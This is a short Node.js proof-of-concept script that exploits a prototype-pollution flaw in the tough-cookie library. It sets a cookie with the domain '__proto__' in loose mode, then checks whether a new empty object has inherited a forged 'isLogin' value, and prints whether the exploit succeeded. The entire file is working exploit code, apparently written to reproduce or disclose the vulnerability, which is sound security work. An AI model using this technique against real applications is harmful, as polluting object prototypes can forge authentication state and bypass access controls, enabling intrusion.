async function main() {
    try {
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "isLogin=polluted; Domain=__proto__; Path=/notauth",
                "https://__proto__/admin",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        var obj = {};
        console.log(obj["/notauth"]["isLogin"]);
        console.log("EXPLOITED SUCCESSFULLY");
    } catch (error) {
        console.error("Error:", error);
        console.log("EXPLOIT FAILED");
    }
}

main();